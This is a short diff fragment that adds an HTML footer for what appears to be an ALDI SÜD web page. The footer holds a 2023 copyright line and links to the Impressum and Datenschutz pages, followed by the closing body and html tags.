+ <footer style="background:#8a8a8a;"><div _ngcontent-serverapp-c42="" class="cell grid-x grid-container grid-padding-y"><div _ngcontent-serverapp-c42="" class="cell large-auto medium-auto" style="color:white;"> © 2023 ALDI SÜD </div><div _ngcontent-serverapp-c42="" class="cell large-auto medium-auto"><a style="color:white;" _ngcontent-serverapp-c42="" href="https://www.aldi-sued.de/de/impressum/" target="_blank" rel="noopener noreferrer">Impressum</a></div><div _ngcontent-serverapp-c42="" class="cell large-auto medium-auto"><a  style="color:white;" _ngcontent-serverapp-c42="" href="https://www.aldi-sued.de/de/datenschutz/" target="_blank" rel="noopener noreferrer">Datenschutz</a></div></div></footer>
+
+</body>
+</html>
